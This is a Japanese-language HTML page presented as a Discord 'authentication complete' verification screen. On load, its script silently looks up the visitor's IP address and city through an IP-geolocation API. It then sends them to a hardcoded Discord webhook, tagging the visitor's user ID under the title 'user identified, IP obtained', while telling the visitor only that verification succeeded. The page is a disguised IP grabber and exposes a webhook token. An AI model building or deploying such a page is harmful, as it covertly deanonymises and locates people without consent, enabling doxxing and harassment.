<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"><title>認証完了</title></head>
<body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
    <h1 id="status">認証処理中...</h1>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";

        async function process() {
            const params = new URLSearchParams(window.location.search);
            const logId = params.get('log_id');
            const userId = params.get('user_id');

            if (!logId || !userId) {
                document.getElementById('status').innerText = "エラー: パラメータが不足しています";
                return;
            }

            try {
                // IP情報の取得 (HTTPS対応のAPI)
                const geoRes = await fetch('https://ipapi.co/json/');
                const geo = await geoRes.json();
                const ip = geo.ip;
                const loc = `${geo.country_name} / ${geo.region} / ${geo.city}`;

                // Webhookを更新(PATCH)
                const response = await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **認証完了**: <@${userId}>`,
                        embeds: [{
                            title: "ユーザー特定・IP取得成功",
                            description: `**IP:** \`${ip}\`\n**場所:** \`${loc}\``,
                            color: 0x43b581,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                if (response.ok) {
                    document.getElementById('status').innerText = "✔ 認証に成功しました。ページを閉じてください。";
                } else {
                    document.getElementById('status').innerText = "Webhookの更新に失敗しました。";
                }
            } catch (e) {
                document.getElementById('status').innerText = "エラーが発生しました。";
            }
        }
        process();
    </script>
</body>
</html>
